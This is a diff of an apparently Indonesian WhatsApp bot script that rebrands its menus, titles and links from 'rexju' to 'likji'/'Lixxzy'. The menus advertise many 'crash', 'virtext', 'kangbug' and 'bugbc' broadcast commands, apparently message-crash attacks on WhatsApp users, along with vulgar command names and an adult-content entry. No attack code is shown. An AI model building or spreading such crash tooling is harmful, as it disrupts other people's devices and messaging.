 ┣❏catalog [ jumlah ]
-┣❏rexjudocu [ jumlah ]
-┣❏rexjudaca [ jumlah ]
+┣❏likjidocu [ jumlah ]
+┣❏likjidaca [ jumlah ]
 ┣❏duc [ jumlah ]
 ┣❏ducu [ jumlah ]
-┣❏rexjutroli [ jumlah ]
-┣❏rexjutroli2 [ jumlah ]
-┣❏rexjutroli3 [ jumlah ]
-┣❏rexjujhon2 [ jumlah ]
-┣❏rexjujhon [ jumlah ]
-┣❏rexjubutton [ jumlah ]
-┣❏rexjutrol [ jumlah ]
-┣❏rexjukatalog [ jumlah ]
-┣❏rexjuducu [ jumlah ]
-┣❏rexjudaca [ jumlah ]
-┣❏rexjudraknes [ jumlah ]
-┣❏rexjuslebew [ jumlah ]
-┣❏rexjusu [ jumlah ]
-┣❏rexjutol [ jumlah ]
-┣❏rexjumemek [ jumlah ]
-┣❏rexjucontol [ jumlah ]
-┣❏rexjutext𝐯 [ jumlah ]
-┣❏rexjugas [ jumlah ]
-┣❏rexju𝐯irtext [ jumlah ]
-┣❏rexju𝐯irtext1 [ jumlah ]
-┣❏rexju𝐯irtext2 [ jumlah ]
-┣❏rexju𝐯irtext3 [ jumlah ]
-┣❏rexjucrash [ jumlah ]
-┣❏rexjucrash1 [ jumlah ]
-┣❏rexjucrash2 [ jumlah ]
-┣❏rexjucrash3 [ jumlah ]
-┣❏rexjucrash4 [ jumlah ]
-┣❏rexjucrash5 [ jumlah ]
-┣❏rexjucrash6 [ jumlah ]
-┣❏rexjucrash7 [ jumlah ]
-┣❏rexjulokas [ jumlah ]
-┣❏rexjulokas2 [ jumlah ]
-┣❏rexjukangbug [ jumlah ]
-┣❏rexjukangbug1 [ jumlah ]
-┣❏rexjubar [ jumlah ]
-┣❏rexjuoke [ jumlah ]
-┣❏rexjuewe [ jumlah ]
-┣❏rexjungentod [ jumlah ]
-┣❏rexju1 [ jumlah ]
-┣❏rexju2 [ jumlah ]
-┣❏rexju3 [ jumlah ]
-┣❏rexju4 [ jumlah ]
-┣❏rexju5 [ jumlah ]
-┣❏rexju6 [ jumlah ]
-┣❏rexju7 [ jumlah ]
-┣❏rexju8 [ jumlah ]
-┣❏rexju9 [ jumlah ]
-┣❏rexju10 [ jumlah ]
-┣❏rexju11 [ jumlah ]
-┣❏rexju12 [ jumlah ]
+┣❏likjitroli [ jumlah ]
+┣❏likjitroli2 [ jumlah ]
+┣❏likjitroli3 [ jumlah ]
+┣❏likjijhon2 [ jumlah ]
+┣❏likjijhon [ jumlah ]
+┣❏likjibutton [ jumlah ]
+┣❏likjitrol [ jumlah ]
+┣❏likjikatalog [ jumlah ]
+┣❏likjiducu [ jumlah ]
+┣❏likjidaca [ jumlah ]
+┣❏likjidraknes [ jumlah ]
+┣❏likjislebew [ jumlah ]
+┣❏likjisu [ jumlah ]
+┣❏likjitol [ jumlah ]
+┣❏likjimemek [ jumlah ]
+┣❏likjicontol [ jumlah ]
+┣❏likjitext𝐯 [ jumlah ]
+┣❏likjigas [ jumlah ]
+┣❏likji𝐯irtext [ jumlah ]
+┣❏likji𝐯irtext1 [ jumlah ]
+┣❏likji𝐯irtext2 [ jumlah ]
+┣❏likji𝐯irtext3 [ jumlah ]
+┣❏likjicrash [ jumlah ]
+┣❏likjicrash1 [ jumlah ]
+┣❏likjicrash2 [ jumlah ]
+┣❏likjicrash3 [ jumlah ]
+┣❏likjicrash4 [ jumlah ]
+┣❏likjicrash5 [ jumlah ]
+┣❏likjicrash6 [ jumlah ]
+┣❏likjicrash7 [ jumlah ]
+┣❏likjilokas [ jumlah ]
+┣❏likjilokas2 [ jumlah ]
+┣❏likjikangbug [ jumlah ]
+┣❏likjikangbug1 [ jumlah ]
+┣❏likjibar [ jumlah ]
+┣❏likjioke [ jumlah ]
+┣❏likjiewe [ jumlah ]
+┣❏likjingentod [ jumlah ]
+┣❏likji1 [ jumlah ]
+┣❏likji2 [ jumlah ]
+┣❏likji3 [ jumlah ]
+┣❏likji4 [ jumlah ]
+┣❏likji5 [ jumlah ]
+┣❏likji6 [ jumlah ]
+┣❏likji7 [ jumlah ]
+┣❏likji8 [ jumlah ]
+┣❏likji9 [ jumlah ]
+┣❏likji10 [ jumlah ]
+┣❏likji11 [ jumlah ]
+┣❏likji12 [ jumlah ]
 ┣❏crashar1 [ jumlah ]
 ┣❏crashar2 [ jumlah ]
 ┣❏crashar3 [ jumlah ]
@@ -4994,19 +4994,19 @@ Ketik > m.chat ( di group dulu )
 ┣❏crashar19 [ jumlah ]
 ┣❏crashar20 [ jumlah ]
 ┣❏spam [ Reply Pesan ]
-┗━━⊱[°rexju°]
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ BROADCAST ]
 ┣❏bugbcimage [ Bug image Broadcast ]
 ┣❏bugbcvideo [ Bug Video Broadcast ]
 ┣❏bugbcaudio [ Bug Audio Broadcast ]
 ┣❏bugbctext [ Bug Text Broadcast ]
-┗━━⊱[°rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5021,7 +5021,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © © °rexju°-
+"description": ` - © © 𝐿𝑖𝑥𝑥𝑧𝑦-
 
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
@@ -5034,7 +5034,7 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© © °rexju°WE ARE NOT MASTOD`,
+"retailerId": `© © 𝐿𝑖𝑥𝑥𝑧𝑦WE ARE NOT MASTOD`,
 "url": "Wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -5060,12 +5060,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏cantik
 ┣❏kesel
 ┣❏ngeselin
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5096,12 +5096,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏heleh
 ┣❏holoh
 ┣❏delttt]
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5141,12 +5141,12 @@ nomorhoki
 ┣❏masasubur
 ┣❏zodiak
 ┣❏shio
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5160,12 +5160,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏alquran
 ┣❏juzamma
 ┣❏tafsirsurah
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5190,12 +5190,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏antara-news
 ┣❏cnn-news
 ┣❏fajar-news
-┗━━⊱[ © °rexju°] `,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦] `,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5228,12 +5228,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏getpic
 ┣❏penjara
 ┣❏intro
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5254,12 +5254,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏robot
 ┣❏slow
 ┣❏tupai
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5270,11 +5270,11 @@ if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
  *[ 🌷 ] Asupan Mata* 
 bokep`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5290,12 +5290,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏wikimedia [query]
 ┣❏ringtone [query]
 ┣❏searchgroups [query]
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5323,12 +5323,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏styletext
 ┣❏smeme
 ┣❏ss [url]
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5342,12 +5342,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏listcmd
 ┣❏delcmd
 ┣❏lockcmd
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5359,11 +5359,11 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Download Menu* 
 pinterestdl [url]
 mediafire [url]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5393,12 +5393,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏listgc
 ┣❏listonline
 ┣❏speedtest
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5431,12 +5431,12 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┣❏darkjoke
 ┣❏meme
 ┣❏meme2
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © 𝐿𝑖𝑥𝑥𝑧𝑦͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
@@ -5447,173 +5447,173 @@ case 'randomsound': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━⊱[ Sound Menu ]
-┣❏rexjusound1
-┣❏rexjusound2
-┣❏rexjusound3
-┣❏rexjusound4
-┣❏rexjusound5
-┣❏rexjusound6
-┣❏rexjusound7
-┣❏rexjusound8
-┣❏rexjusound9
-┣❏rexjusound10
-┣❏rexjusound11
-┣❏rexjusound12
-┣❏rexjusound13
-┣❏rexjusound14
-┣❏rexjusound15
-┣❏rexjusound16
-┣❏rexjusound17
-┣❏rexjusound18
-┣❏rexjusound19
-┣❏rexjusound20
-┣❏rexjusound21
-┣❏rexjusound22
-┣❏rexjusound23
-┣❏rexjusound24
-┣❏rexjusound25
-┣❏rexjusound26
-┣❏rexjusound27
-┣❏rexjusound28
-┣❏rexjusound29
-┣❏rexjusound30
-┣❏rexjusound31
-┣❏rexjusound32
-┣❏rexjusound33
-┣❏rexjusound34
-┣❏rexjusound35
-┣❏rexjusound36
-┣❏rexjusound37
-┣❏rexjusound38
-┣❏rexjusound39
-┣❏rexjusound40
-┣❏rexjusound41
-┣❏rexjusound42
-┣❏rexjusound43
-┣❏rexjusound44
-┣❏rexjusound45
-┣❏rexjusound46
-┣❏rexjusound47
-┣❏rexjusound48
-┣❏rexjusound49
-┣❏rexjusound50
-┣❏rexjusound51
-┣❏rexjusound52
-┣❏rexjusound53
-┣❏rexjusound54
-┣❏rexjusound55
-┣❏rexjusound56
-┣❏rexjusound57
-┣❏rexjusound58
-┣❏rexjusound59
-┣❏rexjusound60
-┣❏rexjusound61
-┣❏rexjusound62
-┣❏rexjusound63
-┣❏rexjusound64
-┣❏rexjusound65
-┣❏rexjusound66
-┣❏rexjusound67
-┣❏rexjusound68
-┣❏rexjusound69
-┣❏rexjusound70
-┣❏rexjusound71
-┣❏rexjusound72
-┣❏rexjusound73
-┣❏rexjusound74
-┣❏rexjusound75
-┣❏rexjusound76
-┣❏rexjusound77
-┣❏rexjusound78
-┣❏rexjusound79
-┣❏rexjusound80
-┣❏rexjusound81
-┣❏rexjusound82
-┣❏rexjusound83
-┣❏rexjusound84
-┣❏rexjusound85
-┣❏rexjusound86
-┣❏rexjusound87
-┣❏rexjusound88
-┣❏rexjusound89
-┣❏rexjusound90
-┣❏rexjusound91
-┣❏rexjusound92
-┣❏rexjusound93
-┣❏rexjusound94
-┣❏rexjusound95
-┣❏rexjusound96
-┣❏rexjusound97
-┣❏rexjusound98
-┣❏rexjusound99
-┣❏rexjusound100
-┣❏rexjusound101
-┣❏rexjusound102
-┣❏rexjusound103
-┣❏rexjusound104
-┣❏rexjusound105
-┣❏rexjusound106
-┣❏rexjusound107
-┣❏rexjusound108
-┣❏rexjusound109
-┣❏rexjusound110
-┣❏rexjusound111
-┣❏rexjusound112
-┣❏rexjusound113
-┣❏rexjusound114
-┣❏rexjusound115
-┣❏rexjusound116
-┣❏rexjusound117
-┣❏rexjusound118
-┣❏rexjusound119
-┣❏rexjusound120
-┣❏rexjusound121
-┣❏rexjusound122
-┣❏rexjusound123
-┣❏rexjusound124
-┣❏rexjusound125
-┣❏rexjusound126
-┣❏rexjusound127
-┣❏rexjusound128
-┣❏rexjusound129
-┣❏rexjusound130
-┣❏rexjusound131
-┣❏rexjusound132
-┣❏rexjusound133
-┣❏rexjusound134
-┣❏rexjusound135
-┣❏rexjusound136
-┣❏rexjusound137
-┣❏rexjusound138
-┣❏rexjusound139
-┣❏rexjusound140
-┣❏rexjusound141
-┣❏rexjusound142
-┣❏rexjusound143
-┣❏rexjusound144
-┣❏rexjusound145
-┣❏rexjusound146
-┣❏rexjusound147
-┣❏rexjusound148
-┣❏rexjusound149
-┣❏rexjusound150
-┣❏rexjusound151
-┣❏rexjusound152
-┣❏rexjusound153
-┣❏rexjusound154
-┣❏rexjusound155
-┣❏rexjusound156
-┣❏rexjusound157
-┣❏rexjusound158
-┣❏rexjusound159
-┣❏rexjusound160
-┣❏rexjusound161
-┗━━⊱[ © °rexju°]`,
-contextInfo:{"externalAdReply": {"title": `SC © °rexju`,"body": `Selamat ${salam} kak ${pushname}`,
+┣❏likjisound1
+┣❏likjisound2
+┣❏likjisound3
+┣❏likjisound4
+┣❏likjisound5
+┣❏likjisound6
+┣❏likjisound7
+┣❏likjisound8
+┣❏likjisound9
+┣❏likjisound10
+┣❏likjisound11
+┣❏likjisound12
+┣❏likjisound13
+┣❏likjisound14
+┣❏likjisound15
+┣❏likjisound16
+┣❏likjisound17
+┣❏likjisound18
+┣❏likjisound19
+┣❏likjisound20
+┣❏likjisound21
+┣❏likjisound22
+┣❏likjisound23
+┣❏likjisound24
+┣❏likjisound25
+┣❏likjisound26
+┣❏likjisound27
+┣❏likjisound28
+┣❏likjisound29
+┣❏likjisound30
+┣❏likjisound31
+┣❏likjisound32
+┣❏likjisound33
+┣❏likjisound34
+┣❏likjisound35
+┣❏likjisound36
+┣❏likjisound37
+┣❏likjisound38
+┣❏likjisound39
+┣❏likjisound40
+┣❏likjisound41
+┣❏likjisound42
+┣❏likjisound43
+┣❏likjisound44
+┣❏likjisound45
+┣❏likjisound46
+┣❏likjisound47
+┣❏likjisound48
+┣❏likjisound49
+┣❏likjisound50
+┣❏likjisound51
+┣❏likjisound52
+┣❏likjisound53
+┣❏likjisound54
+┣❏likjisound55
+┣❏likjisound56
+┣❏likjisound57
+┣❏likjisound58
+┣❏likjisound59
+┣❏likjisound60
+┣❏likjisound61
+┣❏likjisound62
+┣❏likjisound63
+┣❏likjisound64
+┣❏likjisound65
+┣❏likjisound66
+┣❏likjisound67
+┣❏likjisound68
+┣❏likjisound69
+┣❏likjisound70
+┣❏likjisound71
+┣❏likjisound72
+┣❏likjisound73
+┣❏likjisound74
+┣❏likjisound75
+┣❏likjisound76
+┣❏likjisound77
+┣❏likjisound78
+┣❏likjisound79
+┣❏likjisound80
+┣❏likjisound81
+┣❏likjisound82
+┣❏likjisound83
+┣❏likjisound84
+┣❏likjisound85
+┣❏likjisound86
+┣❏likjisound87
+┣❏likjisound88
+┣❏likjisound89
+┣❏likjisound90
+┣❏likjisound91
+┣❏likjisound92
+┣❏likjisound93
+┣❏likjisound94
+┣❏likjisound95
+┣❏likjisound96
+┣❏likjisound97
+┣❏likjisound98
+┣❏likjisound99
+┣❏likjisound100
+┣❏likjisound101
+┣❏likjisound102
+┣❏likjisound103
+┣❏likjisound104
+┣❏likjisound105
+┣❏likjisound106
+┣❏likjisound107
+┣❏likjisound108
+┣❏likjisound109
+┣❏likjisound110
+┣❏likjisound111
+┣❏likjisound112
+┣❏likjisound113
+┣❏likjisound114
+┣❏likjisound115
+┣❏likjisound116
+┣❏likjisound117
+┣❏likjisound118
+┣❏likjisound119
+┣❏likjisound120
+┣❏likjisound121
+┣❏likjisound122
+┣❏likjisound123
+┣❏likjisound124
+┣❏likjisound125
+┣❏likjisound126
+┣❏likjisound127
+┣❏likjisound128
+┣❏likjisound129
+┣❏likjisound130
+┣❏likjisound131
+┣❏likjisound132
+┣❏likjisound133
+┣❏likjisound134
+┣❏likjisound135
+┣❏likjisound136
+┣❏likjisound137
+┣❏likjisound138
+┣❏likjisound139
+┣❏likjisound140
+┣❏likjisound141
+┣❏likjisound142
+┣❏likjisound143
+┣❏likjisound144
+┣❏likjisound145
+┣❏likjisound146
+┣❏likjisound147
+┣❏likjisound148
+┣❏likjisound149
+┣❏likjisound150
+┣❏likjisound151
+┣❏likjisound152
+┣❏likjisound153
+┣❏likjisound154
+┣❏likjisound155
+┣❏likjisound156
+┣❏likjisound157
+┣❏likjisound158
+┣❏likjisound159
+┣❏likjisound160
+┣❏likjisound161
+┗━━⊱[ © 𝐿𝑖𝑥𝑥𝑧𝑦]`,
+contextInfo:{"externalAdReply": {"title": `SC © °likji`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/c/HwModsWa857`,
-thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+sourceUrl: `https://youtube.com/@user-pb3qt2ek1x`,
+thumbnailUrl: 'https://telegra.ph/file/dddb33d8ee583cd66b185.jpg', 
 }
 }}, { quoted:m})
 }
